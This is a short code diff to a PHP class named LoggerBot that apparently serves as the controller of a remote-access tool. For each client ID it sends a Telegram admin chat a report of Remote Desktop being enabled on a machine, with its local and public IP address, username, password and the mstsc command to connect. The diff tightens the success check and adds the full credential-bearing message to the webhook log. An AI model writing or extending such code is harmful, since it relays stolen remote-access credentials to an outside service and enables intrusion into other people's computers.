@@ -305,24 +305,20 @@ class LoggerBot
             // Prepare Telegram message
             $message = "🖥️ RDP Status Update:\n";
             $message .= "Client ID: $client_id\n";
-            if (isset($rdp_data['status']) && $rdp_data['status'] === 'success') {
-                $message .= "Status: " . ($rdp_data['username'] ? "Enabled" : "Disabled") . "\n";
-                if ($rdp_data['username']) {
-                    $message .= "Local IP: " . ($rdp_data['local_ip'] ?? 'N/A') . "\n";
-                    $message .= "Public IP: " . ($rdp_data['public_ip'] ?? 'N/A') . "\n";
-                    $message .= "Username: {$rdp_data['username']}\n";
-                    $message .= "Password: {$rdp_data['password']}\n";
-                    $message .= "Connect using: mstsc /v:" . ($rdp_data['public_ip'] ?? $rdp_data['local_ip'] ?? 'unknown') . "\n";
-                } else {
-                    $message .= "Details: {$rdp_data['message']}\n";
-                }
+            if (isset($rdp_data['username']) && isset($rdp_data['password'])) {
+                $message .= "Status: Enabled\n";
+                $message .= "Local IP: " . ($rdp_data['local_ip'] ?? 'N/A') . "\n";
+                $message .= "Public IP: " . ($rdp_data['public_ip'] ?? 'N/A') . "\n";
+                $message .= "Username: {$rdp_data['username']}\n";
+                $message .= "Password: {$rdp_data['password']}\n";
+                $message .= "Connect using: mstsc /v:" . ($rdp_data['public_ip'] ?? $rdp_data['local_ip'] ?? 'unknown') . "\n";
             } else {
                 $message .= "Status: Failed\n";
-                $message .= "Error: " . ($rdp_data['message'] ?? 'Unknown error') . "\n";
+                $message .= "Error: " . ($rdp_data['message'] ?? 'Failed to enable RDP') . "\n";
             }
     
             $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
-            $this->logWebhook("RDP report processed for client_id: $client_id");
+            $this->logWebhook("RDP report processed for client_id: $client_id, message: $message");
     
             return ['status' => 'success'];
         } catch (Exception $e) {
